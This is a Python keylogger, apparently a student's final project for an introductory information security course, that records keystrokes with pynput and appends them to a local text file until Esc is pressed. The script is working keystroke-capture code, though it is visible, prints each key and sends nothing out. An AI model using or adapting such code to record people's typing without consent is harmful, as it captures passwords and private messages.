'''
CSC382: Introduction to Information Security Final Project - Keylogger

Created by:
    Samuel Davis and Ethan Evans

Adapted from:
    https://youtu.be/TbMKwl11itQ

'''

from pynput.keyboard import Key, Listener

print("Recording...")
count = 0
keys = []

def on_press(key):
    global keys, count
    print('{0} pressed'.format(key))

    count += 1
    keys.append(key)
    if count >= 5:
        count = 1
        write_file(keys)
        keys = []

def write_file(keys):
    with open("/Users/etevans/Desktop/output.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 1:
                f.write(" ")
            elif k.find("enter") > 1:
                f.write("[ENTER]")
            elif k.find("tab") > 1:
                f.write("[TAB]")
            elif k.find("shift") > 1:
                f.write("[SHIFT]")
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with open("/Users/etevans/Desktop/output.txt", "w") as f:
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
